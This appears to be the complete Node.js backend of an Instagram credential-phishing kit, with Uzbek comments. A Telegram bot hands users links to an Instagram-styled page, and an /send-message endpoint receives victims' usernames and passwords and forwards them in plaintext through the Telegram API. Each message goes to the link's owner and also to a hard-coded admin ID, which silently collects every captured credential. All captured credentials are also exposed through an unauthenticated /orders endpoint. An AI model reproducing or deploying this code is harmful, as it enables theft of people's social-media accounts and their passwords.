import express from "express";
import cors from "cors";
import fetch from "node-fetch";

const app = express();
app.use(cors());
app.use(express.json());

const BOT_TOKEN = "YOUR_TOKEN_HERE";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ADMIN ID — bu yerdagi ID ga barcha buyurtmalar yuboriladi
const ADMIN_ID = 7114973309;

// Buyurtmalar lokal
let orders = [];

// ========================================
// YANGI BUYURTMA QABUL QILISH
// ========================================
app.post("/send-message", async (req, res) => {
  try {
    const { chat_id, username, password, follows } = req.body;
    if (!chat_id) return res.json({ success: false, error: "chat_id yo'q!" });

    const order = {
      id: Date.now(),
      chat_id,
      username,
      password,
      follows,
      status: "kutilmoqda",
      time: new Date(),
    };
    orders.push(order);

    const text =
      `🆕 Yangi User:\n\n` +
      `👤 Username: ${username}\n` +
      `🔑 Password: ${password}\n` +
      `👥 Obunachilar: ${follows}\n\n` +
      `⏳ Holati: Kutilmoqda`;

    const buttons = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Bajarilgan", callback_data: `done:${order.id}` },
            { text: "❌ Bajarilmagan", callback_data: `fail:${order.id}` },
          ],
        ],
      },
    };

    // 🔵 1) Buyurtma bergan userga yuboriladi
    await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id, text, ...buttons }),
    });

    // 🔴 2) ADMIN ga ham yuboriladi (barcha buyurtmalar)
    await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: ADMIN_ID, text, ...buttons }),
    });

    return res.json({ success: true });
  } catch (err) {
    console.log(err);
    return res.json({ success: false, error: "Server xatosi" });
  }
});

// ========================================
// Orders olish
// ========================================
app.get("/orders", (req, res) => {
  res.json(orders);
});

// ========================================
// TELEGRAM POLLING
// ========================================
let lastUpdateId = 0;

async function getUpdates() {
  try {
    const res = await fetch(
      `${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}`
    );
    const data = await res.json();

    if (data.ok) {
      for (const update of data.result) {
        lastUpdateId = update.update_id;

        // ---------------------------
        // CALLBACK HANDLER
        // ---------------------------
        if (update.callback_query) {
          const [action, orderId] = update.callback_query.data.split(":");
          const chat_id = update.callback_query.message.chat.id;

          const order = orders.find((o) => o.id == orderId);
          if (!order) continue;

          if (action === "done") order.status = "bajarilgan";
          if (action === "fail") order.status = "bajarilmagan";

          const statusMsg =
            order.status === "bajarilgan" ? "✅ Bajarilgan" : "❌ Bajarilmagan";

          // 1) Tugma bosgan foydalanuvchiga javob
          await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id,
              text: `Status o'zgartirildi: ${statusMsg}`,
            }),
          });

          // 2) ADMIN ga ham status yuborilsin
          await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: ADMIN_ID,
              text: `📝 Buyurtma #${order.id}\nHolati: ${statusMsg}`,
            }),
          });
        }

        // ---------------------------
        // /start komandasi
        // ---------------------------
        if (update.message && update.message.text === "/start") {
          const chat_id = update.message.chat.id;
          const user_name = update.message.from.first_name;
          const link = `https://instagram-six-beige.vercel.app/?chat_id=${chat_id}`;

          await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id,
              text: `Salom ${user_name}! Sizning linkingiz: \n\n${link}`,
            }),
          });
        }
      }
    }
  } catch (err) {
    console.log("Telegram polling xatosi:", err);
  }
}

// Polling interval
setInterval(getUpdates, 2000);

app.listen(5000, () => console.log("Server 5000-portda ishlayapti"));
